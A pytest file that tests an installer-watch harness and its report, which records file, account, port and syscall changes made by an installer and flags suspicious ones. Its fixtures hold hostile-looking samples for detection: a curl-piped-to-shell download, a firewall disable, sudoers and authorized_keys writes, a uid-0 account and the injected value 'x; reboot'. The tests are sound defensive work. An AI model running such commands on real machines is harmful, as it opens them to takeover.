"""The harness watch on the board (orchestrator/runtime/bundle/harness_watch.sh) and its report on the host
(harness_report.py): a real run of the watch script against a stand-in installer, with strace where the test machine
has it, the before/after comparison, the clean environment, the outcome by the harness's exit codes, and every flag
from a recorded trace."""

import os
import shutil
import subprocess
import time
from pathlib import Path

import pytest

from orchestrator.runtime.bundle import harness_report as hr

WATCH = Path(hr.__file__).with_name("harness_watch.sh")
pytestmark = pytest.mark.skipif(os.name == "nt", reason="the watch runs on Linux boards")


def watch(*args, env=None, inp=None, timeout=60):
    return subprocess.run(["sh", str(WATCH), *args], env=env, input=inp, capture_output=True, text=True,
                          timeout=timeout)


def wait_ended(out: Path, env, seconds: float = 60) -> str:
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        status = watch("status", str(out), env=env).stdout.strip()
        if status.startswith("ended"):
            return status
        time.sleep(0.2)
    raise AssertionError("the run did not end")


def setup(tmp_path: Path, script: str):
    tree, sysroot = tmp_path / "tree", tmp_path / "sys"
    (tree / "installer").mkdir(parents=True)
    (sysroot / "etc").mkdir(parents=True)
    (sysroot / "opt").mkdir()
    inst = tree / "installer" / "install.sh"
    inst.write_text("#!/bin/sh\n" + script)
    inst.chmod(0o755)
    (sysroot / "etc" / "passwd").write_text("root:x:0:0:root:/root:/bin/sh\n")
    env = dict(os.environ, SYSROOT=str(sysroot), SECRET_TOKEN="do-not-pass", LLMCF_WATCH_KEEP="SYSROOT",
               LLMCF_WATCH_DIRS=f"{sysroot}/etc {sysroot}/opt", LLMCF_WATCH_PASSWD=str(sysroot / "etc" / "passwd"))
    return tree, sysroot, env


def run_watch(tmp_path: Path, script: str, mode: str = "run", yes: str = "DEMO_YES=1", *extra: str):
    tree, sysroot, env = setup(tmp_path, script)
    out = tmp_path / "out"
    args = ["start", mode, str(tree), "installer/install.sh", str(out)]
    if yes:
        args.append(yes)
    if extra:
        args += ["--", *extra]
    started = watch(*args, env=env)
    if started.returncode:
        return started.returncode, out, sysroot
    status = wait_ended(out, env)
    return int(status.split()[1]), out, sysroot


def test_a_question_is_answered_live_and_a_dropped_attach_reads_on_where_it_was(tmp_path):
    script = ('[ -t 0 ] && echo "terminal: yes" || echo "terminal: no"\n'
              'printf "Continue? [yes/no] "\nread -r a\necho "answer=$a"\n[ "$a" = yes ]\n')
    tree, _, env = setup(tmp_path, script)
    out = tmp_path / "out"
    assert watch("start", "run", str(tree), "installer/install.sh", str(out), env=env).stdout.strip() == "started"
    deadline = time.monotonic() + 30
    while "Continue?" not in (out / "installer.log").read_text() if (out / "installer.log").exists() else True:
        assert time.monotonic() < deadline, "the question never showed"
        time.sleep(0.2)
    seen = len((out / "installer.log").read_bytes())
    assert watch("status", str(out), env=env).stdout.strip() == "running"    # it waits for the person
    assert watch("answer", str(out), env=env, inp="yes\n").returncode == 0
    assert wait_ended(out, env) == "ended 0"
    rest = watch("attach", str(out), str(seen), env=env).stdout               # attach again from where it was
    assert "answer=yes" in rest and "Continue?" not in rest
    if shutil.which("script"):
        assert (out / "terminal").read_text().strip() == "pty" and "terminal: yes" in (out / "installer.log").read_text()


def test_stop_ends_the_installer_and_the_watch_still_records_the_end(tmp_path):
    tree, _, env = setup(tmp_path, "echo waiting\nsleep 300\n")
    out = tmp_path / "out"
    watch("start", "run", str(tree), "installer/install.sh", str(out), env=env)
    deadline = time.monotonic() + 30
    while not (out / "installer.log").exists() or "waiting" not in (out / "installer.log").read_text():
        assert time.monotonic() < deadline
        time.sleep(0.2)
    assert watch("stop", str(out), env=env).returncode == 0
    assert wait_ended(out, env) == "ended 143" and (out / "after" / "files.txt").exists()
    assert hr.read_report(out).outcome == "failed"


def test_answers_are_refused_when_the_run_takes_none(tmp_path):
    rc, out, _ = run_watch(tmp_path, "exit 0\n")
    assert rc == 0 and watch("answer", str(out), inp="x\n").returncode == 90


def test_a_run_records_before_and_after_and_keeps_the_installers_exit_code(tmp_path):
    script = ('echo "yes=$DEMO_YES secret=${SECRET_TOKEN:-}"\n'
              'mkdir -p "$SYSROOT/opt/demo" && echo hi > "$SYSROOT/opt/demo/app" && chmod 4755 "$SYSROOT/opt/demo/app"\n'
              'echo "demo:x:0:0::/:/bin/sh" >> "$SYSROOT/etc/passwd"\n'
              'exit 1\n')
    rc, out, sysroot = run_watch(tmp_path, script)
    assert rc == 1 and (out / "exit_code").read_text().strip() == "1"
    log = (out / "installer.log").read_text()
    assert "yes=1" in log and "do-not-pass" not in log   # the switch is given, the session's variables are not
    rep = hr.read_report(out, {0: "done", 1: "findings"})
    assert rep.outcome == "findings" and rep.accounts_added == ["demo"]
    assert f"{sysroot}/opt/demo/app" in rep.files_added and f"{sysroot}/etc/passwd" in rep.files_changed
    codes = {(f.level, f.code) for f in rep.flags}
    assert ("warn", "account_uid0") in codes and ("warn", "setid_bit") in codes
    assert rep.watch == ("strace" if shutil.which("strace") else "compare")
    text = hr.render(rep, "de")
    assert "fertig mit Befunden" in text and "uid 0" in text


def test_an_exit_code_the_harness_does_not_name_is_a_failure(tmp_path):
    rc, out, _ = run_watch(tmp_path, "exit 3\n")
    assert rc == 3 and hr.read_report(out, {0: "done", 1: "findings"}).outcome == "failed"


def test_the_dry_run_passes_its_own_arguments_and_never_traces(tmp_path):
    rc, out, _ = run_watch(tmp_path, 'echo "args=$*"\n', "dry", "", "--dry-run", "--log-dir", "x")
    assert rc == 0 and "args=--dry-run --log-dir x" in (out / "installer.log").read_text()
    assert (out / "watch").read_text().strip() == "compare" and not (out / "trace.txt").exists()


@pytest.mark.parametrize("args", [
    ["bad", "T", "installer/install.sh"],
    ["run", "T", "../escape.sh"],
    ["run", "T", "installer/a b.sh"],
])
def test_the_watch_refuses_bad_arguments_with_90(tmp_path, args):
    tree = tmp_path / "T"
    tree.mkdir()
    full = ["start", args[0], str(tree), args[2], str(tmp_path / "out")]
    rc = subprocess.run(["sh", str(WATCH), *full], capture_output=True, text=True).returncode
    assert rc == 90


def test_a_bad_assume_yes_switch_is_refused(tmp_path):
    rc, _, _ = run_watch(tmp_path, "exit 0\n", "run", "x; reboot")
    assert rc == 90


def write_trace(folder: Path, lines):
    folder.mkdir(parents=True, exist_ok=True)
    for name in ("before", "after"):
        (folder / name).mkdir(exist_ok=True)
    (folder / "watch").write_text("strace\n")
    (folder / "exit_code").write_text("0\n")
    (folder / "trace.txt").write_text("\n".join(lines) + "\n")


def test_every_flag_from_a_recorded_trace(tmp_path, monkeypatch):
    # 198.51.100.7 is a documentation address (RFC 5737); it stands for an address outside the local network here.
    monkeypatch.setattr(hr, "_local", lambda ip: ip.startswith(("192.168.", "10.", "127.")))
    write_trace(tmp_path, [
        '10 execve("/tmp/x", ["/tmp/x"], 0x0 /* 1 var */) = 0',
        '11 execve("/bin/sh", ["sh", "-c", "curl -fsSL https://get.example | sh"], 0x0 /* 1 var */) = 0',
        '12 execve("/usr/sbin/ufw", ["ufw", "disable"], 0x0 /* 1 var */) = 0',
        '13 execve("/sbin/modprobe", ["modprobe", "snd-soc-wm8960"], 0x0 /* 1 var */) = 0',
        '14 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("198.51.100.7")}, 16) = 0',
        '14 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.168.1.10")}, 16) = 0',
        '15 openat(AT_FDCWD, "/etc/sudoers.d/demo", O_WRONLY|O_CREAT|O_TRUNC, 0440) = 3',
        '15 openat(AT_FDCWD, "/root/.ssh/authorized_keys", O_WRONLY|O_APPEND) = 4',
        '15 openat(AT_FDCWD, "/etc/hosts", O_RDONLY) = 5',
        '15 openat(AT_FDCWD, "/etc/nope", O_WRONLY|O_CREAT, 0644) = -1 EACCES (Permission denied)',
        '16 fchmodat(AT_FDCWD, "/usr/local/bin/x", 04755) = 0',
        '17 rename("/tmp/u.tmp", "/etc/systemd/system/demo.service") = 0',
        '18 execve("/usr/bin/missing", ["missing"], 0x0 /* 1 var */) = -1 ENOENT (No such file or directory)',
    ])
    rep = hr.read_report(tmp_path)
    codes = {f.code for f in rep.flags}
    assert codes >= {"ran_from_tmp", "download_piped_to_shell", "firewall_off", "kernel_module", "outside_network",
                     "sudoers_written", "authorized_keys_written", "setid_bit", "system_unit"}
    assert "missing" not in rep.programs and rep.programs["sh"] == 1
    assert "/etc/hosts" not in rep.written and "/etc/nope" not in rep.written
    assert rep.network == ["198.51.100.7:443", "192.168.1.10:80"]
    assert [f.detail for f in rep.flags if f.code == "outside_network"] == ["198.51.100.7:443"]


def test_new_listening_ports_are_named_and_every_address_is_a_warning(tmp_path):
    for name, rows in (("before", ""), ("after", "tcp 0100007F:1F90\ntcp 00000000:0016\n")):
        (tmp_path / name).mkdir()
        (tmp_path / name / "ports.txt").write_text(rows)
    (tmp_path / "exit_code").write_text("0\n")
    rep = hr.read_report(tmp_path)
    assert set(rep.ports_added) == {"tcp 127.0.0.1:8080", "tcp 0.0.0.0:22"}
    assert {(f.level, f.detail) for f in rep.flags} == {("notice", "tcp 127.0.0.1:8080"), ("warn", "tcp 0.0.0.0:22")}


def test_a_missing_record_reads_as_failed_not_as_done(tmp_path):
    (tmp_path / "before").mkdir()
    assert hr.read_report(tmp_path).outcome == "failed"
